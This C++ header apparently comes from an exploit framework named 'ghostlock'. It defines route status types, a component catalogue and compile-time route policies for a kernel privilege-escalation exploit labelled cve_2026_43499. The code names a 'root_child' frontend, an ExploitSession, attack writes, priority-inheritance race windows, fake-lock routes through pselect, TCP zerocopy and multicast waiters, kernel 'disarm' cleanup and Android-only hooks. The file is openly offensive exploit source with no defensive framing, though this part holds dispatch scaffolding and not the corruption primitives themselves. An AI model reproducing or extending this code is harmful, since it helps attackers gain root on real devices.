/**
 * @file route.h
 * @brief 43499 核心的按用途头（由 core.cpp 拆分，声明/内联逐字保留）。
 */
#ifndef GHOSTLOCK_CORE_ROUTE_H
#define GHOSTLOCK_CORE_ROUTE_H

#include "log.h"
#include "memory.h"
#include "profile.h"
#include "params.h"

namespace ghostlock::race { class PiRace; }
namespace ghostlock::session { struct ExploitSession; }

/* ==== route/route_status.h ==== */
#ifndef ROUTE_STATUS_H
#define ROUTE_STATUS_H

#include <cstddef>
#include <cstdint>
#include <type_traits>

namespace ghostlock::route {
    enum class RouteResultCode : int32_t {
        Ok = 0,
        Retryable,
        FallbackSafe,
        DirtyFailure,
        Unsupported,
    };

    struct RouteStatus final {
        RouteResultCode code = RouteResultCode::Retryable;
        int32_t step = 0;
        int32_t error_number = 0;
        int32_t userspace_clean = 0;
        int32_t kernel_disarmed = 0;

        [[nodiscard]] constexpr bool is_clean() const noexcept {
            return userspace_clean != 0 && kernel_disarmed != 0;
        }

        [[nodiscard]] constexpr bool is_dirty() const noexcept {
            return code == RouteResultCode::DirtyFailure || !is_clean();
        }

        [[nodiscard]] constexpr bool can_fallback() const noexcept {
            return code == RouteResultCode::FallbackSafe && is_clean();
        }
    };

    static_assert(std::is_standard_layout_v<RouteStatus>);
    static_assert(std::is_trivially_copyable_v<RouteStatus>);
    static_assert(sizeof(RouteStatus) == sizeof(int32_t) * 5);
    static_assert(alignof(RouteStatus) == alignof(int32_t));
    static_assert(offsetof(RouteStatus, code) == 0);
    static_assert(offsetof(RouteStatus, step) == sizeof(int32_t));
    static_assert(offsetof(RouteStatus, error_number) == sizeof(int32_t) * 2);
    static_assert(offsetof(RouteStatus, userspace_clean) == sizeof(int32_t) * 3);
    static_assert(offsetof(RouteStatus, kernel_disarmed) == sizeof(int32_t) * 4);

    inline constexpr RouteResultCode ROUTE_OK = RouteResultCode::Ok;
    inline constexpr RouteResultCode ROUTE_RETRYABLE = RouteResultCode::Retryable;
    inline constexpr RouteResultCode ROUTE_FALLBACK_SAFE =
            RouteResultCode::FallbackSafe;
    inline constexpr RouteResultCode ROUTE_DIRTY_FAILURE =
            RouteResultCode::DirtyFailure;
    inline constexpr RouteResultCode ROUTE_UNSUPPORTED =
            RouteResultCode::Unsupported;
} // namespace ghostlock::route

#endif
/* ==== route/route_api.hpp ==== */
#ifndef GHOSTLOCK_ROUTE_API_HPP
#define GHOSTLOCK_ROUTE_API_HPP

#include <cstdint>
#include <sys/select.h>


namespace ghostlock::session {
    struct ExploitSession;
} // namespace ghostlock::session

namespace ghostlock::route {
    void fdset_put_word(fd_set *set, int32_t word, uint64_t value);

    uint64_t fdset_get_word(const fd_set *set, int32_t word);

    void reserve_standard_io(std::int32_t nfds);

    RouteStatus do_pselect_fake_lock_route(const core::SelectInputs &in);

    RouteStatus do_pselect_route_from_session(const ghostlock::memory::WriteRequest *request);

    std::array<std::int32_t, 3> standard_io_backup_snapshot();

    RouteStatus do_tcp_fake_lock_route(const core::TcpInputs &in);

    RouteStatus do_tcp_route_from_session(const ghostlock::memory::WriteRequest *request);

    RouteStatus do_mcast_fake_lock_route(const core::MulticastInputs &in);

    RouteStatus do_mcast_route_from_session(const ghostlock::memory::WriteRequest *request);
} // namespace ghostlock::route

#endif
/* ==== route/component_catalog.hpp ==== */
#ifndef GHOSTLOCK_COMPONENT_CATALOG_HPP
#define GHOSTLOCK_COMPONENT_CATALOG_HPP

#include <cstdint>
#include <string_view>


namespace ghostlock::runtime {
    /* Stable component ids. Explicit numeric values; never rely on the
     * compiler's enum layout. Batch 3 registers one implementation per class
     * (root_child frontend, cve_2026_43499 backend); the UMH / 64560 ids are
     * reserved and report unavailable until their own batches land. */
    enum class FrontendKind : std::uint8_t {
        RootChild = 1,
        UmhForward = 2,
    };

    enum class BackendKind : std::uint8_t {
        Cve2026_43499 = 1,
        Cve2026_64560 = 2,
    };

    /* Middleware reuses the profile route enum: the three tactics are exactly
     * the set the wire carries. Auto means "unresolved" and is never
     * selectable. */
    using MiddlewareKind = ghostlock::profile::RouteKind;

    struct ComponentSelection final {
        FrontendKind frontend;
        BackendKind backend;
        MiddlewareKind middleware;
    };

    [[nodiscard]] constexpr bool frontend_available(FrontendKind kind) noexcept {
        return kind == FrontendKind::RootChild;
    }

    [[nodiscard]] constexpr bool backend_available(BackendKind kind) noexcept {
        return kind == BackendKind::Cve2026_43499;
    }

    [[nodiscard]] constexpr bool middleware_available(MiddlewareKind kind) noexcept {
        return kind == MiddlewareKind::TcpZerocopy ||
               kind == MiddlewareKind::SelectStack ||
               kind == MiddlewareKind::MulticastWaiter;
    }

    /* Per-id availability pre-check: the three ids are each selectable. This
     * says nothing about whether the tuple is a catalogued pipeline. */
    [[nodiscard]] constexpr bool selection_supported(
        const ComponentSelection &selection) noexcept {
        return frontend_available(selection.frontend) &&
               backend_available(selection.backend) &&
               middleware_available(selection.middleware);
    }

    /* THE dispatch authority: the exact tuples the orchestrator can enumerate
     * and run. selection_supported() must hold for every supported combination,
     * but not every available triple is catalogued (e.g. Auto is never a
     * middleware, and future frontends/backends are added here explicitly).
     * Adding a component updates this catalogue and the orchestrator switch
     * together; the host test asserts the two never diverge. */
    [[nodiscard]] constexpr bool combination_supported(
        const ComponentSelection &selection) noexcept {
        return selection.frontend == FrontendKind::RootChild &&
               selection.backend == BackendKind::Cve2026_43499 &&
               middleware_available(selection.middleware);
    }

    /* Dispatch target for one catalogued combination. It names the FULL triple,
     * not just the middleware: opening a second frontend/backend must extend
     * this enum and the mapping below, so the dispatch can never key on a
     * single axis while the catalogue grows on the others. Pipeline exposes it
     * as Pipeline::target and every orchestrator case asserts its own target
     * against that value, so a branch cannot be wired to another (still
     * supported) combination without failing to compile. */
    enum class DispatchTarget : std::uint8_t {
        None,
        RootChild_Cve43499_SelectStack,
        RootChild_Cve43499_TcpZerocopy,
        RootChild_Cve43499_MulticastWaiter,
    };

    [[nodiscard]] constexpr DispatchTarget dispatch_target_of(
        FrontendKind frontend, BackendKind backend,
        MiddlewareKind middleware) noexcept {
        if (frontend != FrontendKind::RootChild ||
            backend != BackendKind::Cve2026_43499) {
            return DispatchTarget::None;
        }
        switch (middleware) {
            case MiddlewareKind::SelectStack:
                return DispatchTarget::RootChild_Cve43499_SelectStack;
            case MiddlewareKind::TcpZerocopy:
                return DispatchTarget::RootChild_Cve43499_TcpZerocopy;
            case MiddlewareKind::MulticastWaiter:
                return DispatchTarget::RootChild_Cve43499_MulticastWaiter;
            default:
                return DispatchTarget::None;
        }
    }

    [[nodiscard]] constexpr DispatchTarget dispatch_target(
        const ComponentSelection &selection) noexcept {
        if (!combination_supported(selection)) return DispatchTarget::None;
        return dispatch_target_of(selection.frontend, selection.backend,
                                  selection.middleware);
    }

    [[nodiscard]] constexpr std::string_view frontend_name(FrontendKind kind) noexcept {
        return kind == FrontendKind::RootChild ? "root_child" : "umh_forward";
    }

    [[nodiscard]] constexpr std::string_view backend_name(BackendKind kind) noexcept {
        return kind == BackendKind::Cve2026_43499 ? "cve_2026_43499" : "cve_2026_64560";
    }

    [[nodiscard]] constexpr std::string_view middleware_name(MiddlewareKind kind) noexcept {
        switch (kind) {
            case MiddlewareKind::TcpZerocopy: return "tcp_zerocopy";
            case MiddlewareKind::SelectStack: return "select_stack";
            case MiddlewareKind::MulticastWaiter: return "multicast_waiter";
            default: return "auto";
        }
    }
} // namespace ghostlock::runtime

#endif
/* ==== route/backend_policy.hpp ==== */
#ifndef GHOSTLOCK_BACKEND_POLICY_HPP
#define GHOSTLOCK_BACKEND_POLICY_HPP


namespace ghostlock::runtime::backend {
    /* Batch 4 DECLARATION-ONLY backend scaffolding (D2 shallow placeholder).
     * These structs name the known backend ids; they expose no execution path
     * and no availability logic. Availability is owned by
     * component_catalog::backend_available(), and the static_asserts below fail
     * to compile if this declaration drifts from it. cve_2026_64560 is a known
     * but unavailable id (rejected before the attack by the orchestrator). */

    struct Cve2026_43499 final {
        static constexpr BackendKind kind = BackendKind::Cve2026_43499;
    };

    struct Cve2026_64560 final {
        static constexpr BackendKind kind = BackendKind::Cve2026_64560;
    };

    static_assert(backend_available(Cve2026_43499::kind));
    static_assert(!backend_available(Cve2026_64560::kind));
} // namespace ghostlock::runtime::backend

#endif
/* ==== route/route_lifecycle.hpp ==== */
#ifndef GHOSTLOCK_ROUTE_LIFECYCLE_HPP
#define GHOSTLOCK_ROUTE_LIFECYCLE_HPP

#include <concepts>


namespace ghostlock::route {
    /* Structural contract shared by the route classes. Expressed as a concept
 * rather than a virtual base: the lifecycle runs inside the PI race window,
 * so no vtable or indirect dispatch may enter the path. */
    template<class R>
    concept RouteLifecycle = requires(R &route)
    {
        { route.prepare() } -> std::convertible_to<int32_t>;
        { route.execute() } -> std::same_as<RouteStatus>;
        route.disarm();
        route.destroy();
        { route.status } -> std::convertible_to<RouteStatus>;
    };

    /* The validated order: prepare -> execute (only when prepare succeeded) ->
 * disarm -> destroy. Returns the outcome the route published in `status`. */
    template<RouteLifecycle R>
    RouteStatus run_route_lifecycle(R &route) {
        if (route.prepare() == 0) {
            (void) route.execute();
        }
        route.disarm();
        route.destroy();
        return route.status;
    }
} // namespace ghostlock::route

#endif
/* ==== route/route_controller.h ==== */
#ifndef ROUTE_CONTROLLER_H
#define ROUTE_CONTROLLER_H


namespace ghostlock::route {
    /* Thin entry over the route-policy registry: the profile picks the policy
     * and the generic dispatcher runs it (with the declared fallback), so no
     * per-route branch lives here. */
    struct RouteController {
        ghostlock::race::PiRace *race;
        const ghostlock::profile::TargetProfile *profile;
        /* Kept as int: the field narrows this struct and measurably moves the
         * waiter_thread stack offsets (CPP17 experiment). */
        int32_t fallback_used;

        void init(ghostlock::race::PiRace *race,
                  const ghostlock::profile::TargetProfile *profile);

        ghostlock::route::RouteStatus execute(const ghostlock::memory::WriteRequest *request);
    };
} // namespace ghostlock::route

#endif
/* ==== route/route_middleware.hpp ==== */
#ifndef GHOSTLOCK_ROUTE_MIDDLEWARE_HPP
#define GHOSTLOCK_ROUTE_MIDDLEWARE_HPP


namespace ghostlock::route::middleware {
    /* Batch 4 (D1=B slice 3b) middleware entry for one route write; called from
     * the cve_2026_43499 backend's attack_write. The route/race behavior is
     * unchanged (run_main_route_threads still selects and runs the route
     * policy). */
    Status run_middleware_route(session::ExploitSession &session,
                                const memory::WriteRequest &request);
} // namespace ghostlock::route::middleware

#endif
/* ==== route/route_policy.hpp ==== */
#ifndef GHOSTLOCK_ROUTE_POLICY_HPP
#define GHOSTLOCK_ROUTE_POLICY_HPP

#include <concepts>
#include <optional>
#include <tuple>
#include <type_traits>
#include <variant>


namespace ghostlock::session {
    struct ExploitSession;
}

namespace ghostlock::route {
    RouteStatus do_pselect_route_from_session(const memory::WriteRequest *request);

    RouteStatus do_tcp_route_from_session(const memory::WriteRequest *request);

    RouteStatus do_mcast_route_from_session(const memory::WriteRequest *request);

    using RouteKind = ghostlock::profile::RouteKind;

    /* Native middleware catalog (Batch 3): each policy is one selectable
     * middleware tactic (tcp_zerocopy | select_stack | multicast_waiter). The
     * orchestrator (route/orchestrator.hpp) picks the pipeline; this registry
     * maps a resolved route to its compile-time policy.
     *
     * One resolved route's behavior. A policy is a tag type whose compile-time
     * capabilities replace every `supports(RouteKind)` branch in the run stages,
     * and whose run() is the per-write entry point. Adding a route means adding
     * a policy and listing it in RoutePolicyList below; no stage edits. */
    template<class P>
    concept RoutePolicy = requires(const profile::TargetProfile &profile,
                                   const memory::WriteRequest *request)
    {
        { P::kind } -> std::convertible_to<RouteKind>;
        { P::supported(profile) } -> std::same_as<bool>;
        { P::run(request) } -> std::same_as<RouteStatus>;
    };

    /* Route capability defaults. Adding a capability becomes one `static
     * constexpr` default here (false): existing policies inherit it untouched,
     * and a policy that needs true just redeclares it. Capabilities are read
     * through the concrete policy type, so a redeclaration hides the base
     * default and stays a direct compile-time compare - no indirect dispatch
     * ever enters the PI-window path. */
    struct RoutePolicyDefaults {
        static constexpr bool multicast = false;
        static constexpr bool w2_fast_repair = false;
        static constexpr bool w3_exact_target = false;
        static constexpr bool tcp_payload_layout = false;
        static constexpr bool allows_fallback = false;

        /* Middleware route hooks (Batch 4, D1=B). Only the route steps with side
         * effects are hooks; pure capability queries stay on the
         * static-constexpr capabilities above. The neutral defaults live here so
         * every policy inherits the whole interface; a policy that needs
         * different behavior redeclares the hook and the Android-only definition
         * lives in that middleware's procedure unit. The backend steps call
         * these directly through the middleware policy template parameter
         * (route/pipeline.hpp), so no vtable or runtime dispatch enters the
         * path. */
        static bool w2_fast_repair_prebuild(session::ExploitSession &) noexcept {
            return true;
        }

        static bool w2_fast_repair_activate(session::ExploitSession &) noexcept {
            return true;
        }
    };

    struct SelectPolicy : RoutePolicyDefaults {
        static constexpr RouteKind kind = RouteKind::SelectStack;

        static bool supported(const profile::TargetProfile &profile) noexcept {
            return profile.supports(kind);
        }

        static RouteStatus run(const memory::WriteRequest *request) {
            return do_pselect_route_from_session(request);
        }
    };

    struct TcpPolicy : RoutePolicyDefaults {
        static constexpr RouteKind kind = RouteKind::TcpZerocopy;
        static constexpr bool w3_exact_target = true;
        static constexpr bool tcp_payload_layout = true;
        static constexpr bool allows_fallback = true;

        static bool supported(const profile::TargetProfile &profile) noexcept {
            return profile.supports(kind);
        }

        static RouteStatus run(const memory::WriteRequest *request) {
            return do_tcp_route_from_session(request);
        }
    };

    struct MulticastPolicy : RoutePolicyDefaults {
        static constexpr RouteKind kind = RouteKind::MulticastWaiter;
        static constexpr bool multicast = true;
        static constexpr bool w2_fast_repair = true;

        static bool supported(const profile::TargetProfile &profile) noexcept {
            return profile.supports(kind);
        }

        static RouteStatus run(const memory::WriteRequest *request) {
            return do_mcast_route_from_session(request);
        }

#if defined(__ANDROID__)
        /* Route-hook overrides: declared here, defined in
         * multicast_waiter_route.cpp (Android-only implementation). noinline is
         * the explicit middleware boundary: the backend steps call these
         * directly, and without it LTO inlines the whole route body into the
         * attack functions. */
        [[gnu::noinline]] static bool w2_fast_repair_prebuild(
            session::ExploitSession &exploit_session) noexcept;

        [[gnu::noinline]] static bool w2_fast_repair_activate(
            session::ExploitSession &exploit_session) noexcept;
#endif
    };

    /* Compile-time middleware contract (Batch 4, D1=B slice 3c): every route
     * policy must expose the side-effecting route hooks. A policy inherits the
     * neutral defaults; a signature drift or a missing hook fails here. */
    template<class P>
    concept MiddlewarePolicy = RoutePolicy<P> &&
        requires(session::ExploitSession &exploit_session,
                 const memory::WriteRequest &request) {
            { P::w2_fast_repair_prebuild(exploit_session) } -> std::same_as<bool>;
            { P::w2_fast_repair_activate(exploit_session) } -> std::same_as<bool>;
        };

    static_assert(MiddlewarePolicy<SelectPolicy>);
    static_assert(MiddlewarePolicy<TcpPolicy>);
    static_assert(MiddlewarePolicy<MulticastPolicy>);

    /* The single registry. Appending a policy here wires every generic loop
     * below (variant, selection, fallback lookup, capabilities). */
    using RoutePolicyList = std::tuple<SelectPolicy, TcpPolicy, MulticastPolicy>;

    template<class T>
    struct variant_of;
    template<class... Ps>
    struct variant_of<std::tuple<Ps...>> {
        using type = std::variant<Ps...>;
    };

    template<class Fn, class... Ps>
    constexpr void for_each_policy(Fn &&fn, std::tuple<Ps...> *) {
        (fn.template operator()<Ps>(), ...);
    }

    template<class Fn>
    constexpr void for_each_policy(Fn &&fn) {
        for_each_policy(std::forward<Fn>(fn),
                        static_cast<RoutePolicyList *>(nullptr));
    }

    /* Derived from RoutePolicyList, so a new route touches one list only. */
    using RoutePolicyVariant = typename variant_of<RoutePolicyList>::type;

    /* Single route->policy mapping; for_each_policy keeps it automatic when the
     * registry grows. */
    [[nodiscard]] inline RoutePolicyVariant make_route_policy(
        const profile::TargetProfile &profile) noexcept {
        RoutePolicyVariant selected = SelectPolicy{};
        for_each_policy([&]<class P>() {
            if (P::supported(profile)) selected = P{};
        });
        return selected;
    }

    /* Visit the resolved policy so a call site can branch on compile-time
     * capabilities with `if constexpr` instead of on the route kind. Used by
     * the stage hooks, which run outside the PI window. */
    template<class Fn>
    constexpr decltype(auto) with_route_policy(
        const profile::TargetProfile &profile, Fn &&fn) {
        return std::visit(std::forward<Fn>(fn), make_route_policy(profile));
    }

    /* Read one compile-time capability of the resolved policy using a direct
     * compare/branch chain (no std::visit), safe for the PI window where an
     * indirect dispatch must not enter (route_lifecycle.hpp). */
    template<class Projection>
    bool route_capability(const profile::TargetProfile &profile,
                          Projection projection) noexcept {
        bool result = false;
        for_each_policy([&]<class P>() {
            if (!result && P::supported(profile)) result = projection(P{});
        });
        return result;
    }

    template<class P>
    bool run_policy_matching(RouteStatus &status, RouteKind kind,
                             const memory::WriteRequest *request) {
        if (kind != P::kind) return false;
        status = P::run(request);
        return true;
    }

    [[nodiscard]] inline RouteStatus run_policy_by_kind(
        RouteKind kind, const memory::WriteRequest *request) {
        RouteStatus status{.code = ROUTE_UNSUPPORTED};
        bool matched = false;
        for_each_policy([&]<class P>() {
            if (!matched) matched = run_policy_matching<P>(status, kind, request);
        });
        return status;
    }

    struct RouteRunResult {
        RouteStatus status{};
        bool fallback_used = false;
    };

    template<RoutePolicy Policy>
    RouteRunResult run_route_policy(const profile::TargetProfile &profile,
                                    const memory::WriteRequest *request,
                                    int32_t allow_fallback) {
        RouteRunResult result{};
        if (!Policy::supported(profile)) {
            result.status = RouteStatus{.code = ROUTE_UNSUPPORTED};
            return result;
        }
        result.status = Policy::run(request);
        if constexpr (Policy::allows_fallback) {
            if (result.status.code != ROUTE_OK && allow_fallback &&
                result.status.can_fallback()) {
                const RouteKind fallback = profile.fallback_route();
                if (fallback != RouteKind::Auto && fallback != Policy::kind) {
                    const RouteStatus next = run_policy_by_kind(fallback, request);
                    if (next.code != ROUTE_UNSUPPORTED) {
                        result.status = next;
                        result.fallback_used = true;
                    }
                }
            }
        }
        return result;
    }

    /* Select and run the resolved policy with a direct dispatch chain (no
     * std::visit), for the PI-window caller. */
    [[nodiscard]] inline RouteRunResult run_route(
        const profile::TargetProfile &profile,
        const memory::WriteRequest *request, int32_t allow_fallback) {
        RouteRunResult result{};
        bool handled = false;
        for_each_policy([&]<class P>() {
            if (!handled && P::supported(profile)) {
                result = run_route_policy<P>(profile, request, allow_fallback);
                handled = true;
            }
        });
        if (!handled) result.status = RouteStatus{.code = ROUTE_UNSUPPORTED};
        return result;
    }

    /* True when the resolved policy needs the post-race ghost disarm. */
    [[nodiscard]] inline bool route_needs_ghost_disarm(
        const profile::TargetProfile &profile) noexcept {
        return route_capability(profile, [](auto policy) {
            return std::decay_t<decltype(policy)>::multicast;
        });
    }
} // namespace ghostlock::route

#endif

#endif // GHOSTLOCK_CORE_ROUTE_H
